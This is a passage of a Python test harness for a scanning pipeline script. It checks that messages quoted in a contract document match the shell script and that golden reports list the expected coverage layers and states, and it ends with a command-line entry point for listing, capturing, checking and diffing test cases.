        """A message in sections 4 to 8 or 11 of the contract that scan_pipeline.sh does not contain is a typo or a stale
        sentence. Text between `<...>`, `[...]` or `...` is a placeholder; a fragment must end where the script's word ends."""
        text = CONTRACT.read_text(encoding="utf-8")
        script = (ROOT / "scan_pipeline.sh").read_text(encoding="utf-8")
        body = text[text.index("## 4. The JSON report"):text.index("## 9. Security")] + \
            text[text.index("## 11. Behaviour"):text.index("## Appendix A")]
        unknown = []
        for span in re.findall(r"`([^`\n]+)`", body):
            if not span.startswith(self.MESSAGE_PREFIXES) or span.startswith(self.PYTHON_ONLY):
                continue
            if span.startswith("partial:"):
                span = span[len("partial:"):]       # the script joins the reasons behind "partial:" at run time
            for frag in re.split(r"<[^>]*>|\[[^\]]*\]|\u2026|\.\.\.", span):
                frag = frag.strip()
                end = r"(?![A-Za-z0-9_])" if re.match(r"[A-Za-z0-9_]", frag[-1:]) else ""
                if len(frag) >= 8 and not re.search(re.escape(frag) + end, script):
                    unknown.append(frag)
        self.assertEqual(unknown, [])

    def test_every_golden_records_all_nine_layers(self):
        for name, rep in _golden_reports().items():
            self.assertEqual(set(rep["coverage"]), LAYER_IDS, name)

    def test_every_coverage_state_of_every_golden_is_in_section_7(self):
        pats = self.states_of_section_7()
        self.assertGreater(len(pats), 20)
        for name, rep in _golden_reports().items():
            for layer, state in rep["coverage"].items():
                self.assertTrue(any(p.match(state) for p in pats), "%s: %s = %r is not in section 7 of the contract" % (name, layer, state))


def cmd_selftest(args) -> int:
    suite = unittest.defaultTestLoader.loadTestsFromModule(sys.modules[__name__])
    return 0 if unittest.TextTestRunner(verbosity=2 if args.verbose else 1).run(suite).wasSuccessful() else 1


def main() -> int:
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    sub = ap.add_subparsers(dest="cmd", required=True)
    sub.add_parser("selftest").add_argument("-v", "--verbose", action="store_true")
    for name in ("list", "capture", "check", "diff"):
        p = sub.add_parser(name)
        p.add_argument("--case", action="append", help="run only this case (repeatable)")
        if name in ("capture", "check"):
            p.add_argument("--engine", choices=sorted(ENGINES), default="bash")
        if name == "check":
            p.add_argument("--quiet", action="store_true")
    args = ap.parse_args()
    if args.cmd == "list":
        for c in CASES:
            print("%-26s %s" % (c.name, c.note))
        return 0
    return {"capture": cmd_capture, "check": cmd_check, "diff": cmd_diff, "selftest": cmd_selftest}[args.cmd](args)


if __name__ == "__main__":
    sys.exit(main())
